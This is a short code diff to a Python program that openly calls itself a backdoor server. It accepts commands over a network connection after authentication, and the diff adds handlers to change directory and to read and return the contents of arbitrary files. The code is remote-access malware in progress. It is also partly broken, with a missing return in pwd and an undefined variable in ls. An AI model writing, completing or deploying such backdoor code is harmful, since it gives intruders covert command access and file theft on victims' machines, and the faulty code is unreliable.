@@ -52,7 +52,7 @@ def authenticate(message):
 def backdoor(connection):
     connection.send("Authentication successful, waiting for commands".encode());
     connection.send("--help for command list".encode())
-    directory = os.getcwd();
+
     while True:
         # Receive command and interpret accordingly
         request = connection.recv(1024).decode().replace("\n", "")
@@ -92,20 +92,22 @@ def backdoor(connection):
 
 #Returns current directory
 def pwd():
-    return directory
+    os.getcwd()
 
 # Changes to specified directory
 def cd(directory):
-    print()
+    os.chdir(directory)
+
 
 # Lists contents of current directory
 def ls():
-    ret = os.listdir(directory)
+    ret = os.listdir(currentDir)
     return ret
 
 # Returns contents of given file
 def cat(filename):
-    print()
+    with open(filename) as ret:
+        return ret.read()
 
 # Prints command list
 def help():
@@ -122,6 +124,7 @@ def help():
 # Shuts down backdoor server
 def off():
     print()
+
 
 
 
